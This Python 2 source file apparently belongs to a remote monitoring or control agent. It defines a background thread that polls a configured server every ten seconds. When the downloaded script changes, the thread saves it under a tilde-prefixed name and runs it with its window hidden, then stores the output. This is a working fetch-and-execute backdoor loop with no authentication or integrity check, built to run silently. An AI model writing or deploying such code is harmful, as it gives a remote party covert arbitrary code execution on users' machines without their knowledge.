# -*- coding: utf-8 -*-

import os, sys
import threading
import defines
import time
import subprocess
import base64
#from hashlib import md5
import md5
import logger
import config

log = None


class Scripter(threading.Thread):
    def __init__(self, selfdir):
        threading.Thread.__init__(self)
        self.selfdir = selfdir
        self.datadir = os.path.expandvars(config.DATADIR)
        self.url = config.URL + '/script'
        global log
        log = logger.Logger(os.path.join(self.datadir, 'logs/~screens.log'), 'scripter')
        self.daemon = False   
        if sys.platform.startswith('win'):
            self.script = os.path.join(self.datadir, 'script', '~script.bat')
        else:
            self.script = os.path.join(self.datadir, 'script', '~script')
        self.script_out = os.path.join(os.path.dirname(self.script), 'script.out')
            
        try:
            os.makedirs(os.path.dirname(self.script))
            os.makedirs(self.datadir)            
        except:
            pass
            
    
    def run(self):
        while True:
            try:
                text = defines.GET(self.url)
                text_e = ''            
                if os.path.exists(self.script):
                    with open(self.script, 'rb') as fp_e:
                        text_e = fp_e.read()
                if md5.new(text).digest() != md5.new(text_e).digest():
                    with open(self.script, 'wb') as fp:
                        fp.write(text)
                    text_out = self.exec_script()
                    with open(self.script_out, 'wb') as fp:
                        fp.write(text_out)
                    
            except Exception as e:
                log.exception(e)
                
            time.sleep(10)
            
    
    def exec_script(self):
        si = subprocess.STARTUPINFO()
        si.dwFlags = subprocess.STARTF_USESHOWWINDOW
        si.wShowWindow = subprocess.SW_HIDE
        return subprocess.Popen(self.script, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, shell=False, startupinfo=si).communicate()[0]
        
            

if __name__ == "__main__":
    selfdir = os.path.abspath(os.path.dirname(__file__))
    Scripter(selfdir).start()
            